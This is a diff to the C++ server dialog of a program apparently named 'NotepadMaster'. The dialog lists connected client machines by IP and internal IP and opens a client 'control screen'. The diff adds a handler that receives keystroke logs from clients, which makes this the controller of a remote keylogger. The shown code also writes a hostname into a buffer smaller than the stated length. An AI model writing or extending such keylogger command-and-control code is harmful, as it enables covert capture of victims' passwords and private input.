@@ -116,8 +116,8 @@ BOOL CNotepadMasterServerDlg::OnInitDialog()
 	CRect rect;
 	m_list_clients.GetClientRect(&rect);
 	m_list_clients.InsertColumn(0, TEXT("no"), LVCFMT_LEFT, 50);
-	m_list_clients.InsertColumn(1, TEXT("IP"), LVCFMT_LEFT, 110);
-	m_list_clients.InsertColumn(2, TEXT("Internal IP"), LVCFMT_LEFT, 110);
+	m_list_clients.InsertColumn(1, TEXT("IP"), LVCFMT_LEFT, 150);
+	m_list_clients.InsertColumn(2, TEXT("Internal IP"), LVCFMT_LEFT, 150);
 
 	char hostname[20] = "";
 	if (gethostname(hostname, 50) == 0)
@@ -210,12 +210,14 @@ void CNotepadMasterServerDlg::ClientAccept()
 	m_client_list[index]->socket = newsocket;
 }
 
-
+/* 클라이언트 조종 화면을 띄워줌 */
 void CNotepadMasterServerDlg::OnDblclkListClients(NMHDR *pNMHDR, LRESULT *pResult)
 {
 	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
 	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
-	
+	if (pNMItemActivate->iItem < 0) // 선택을 올바르게 하지 않았으면
+		return;
+
 	CString format;
 	format.Format(L"User#%d", pNMItemActivate->iItem + 1);
 
@@ -228,11 +230,22 @@ void CNotepadMasterServerDlg::OnDblclkListClients(NMHDR *pNMHDR, LRESULT *pResul
 	*pResult = 0;
 }
 
-
+/* 접속 때 설정해주지 못한 값(내부망 IP 등)을 설정해줌 */
 void CNotepadMasterServerDlg::SetInvisibleInfo(CClientSocket* pObj, CString internal_ip)
 {
 	// TODO: 여기에 구현 코드 추가.
 	UINT index = 0;
-	for (index = 0; m_client_list[index]->socket != pObj; index++);
+	for (index = 0; m_client_list[index]->socket != pObj; index++); // 요청이 들어온 소켓이 포함된 유저 페이지의 인덱스를 구함
 	m_list_clients.SetItemText(index, 2, internal_ip);
+}
+
+
+void CNotepadMasterServerDlg::ReceiveKeylog(CClientSocket* pObj, PDUKeylog* pdu)
+{
+	// TODO: 여기에 구현 코드 추가.
+	UINT index = 0;
+	for (index = 0; m_client_list[index]->socket != pObj; index++); // 요청이 들어온 소켓이 포함된 유저 페이지의 인덱스를 구함
+
+	m_client_list[index]->ReceiveKeylog(pdu);
+	return;
 }
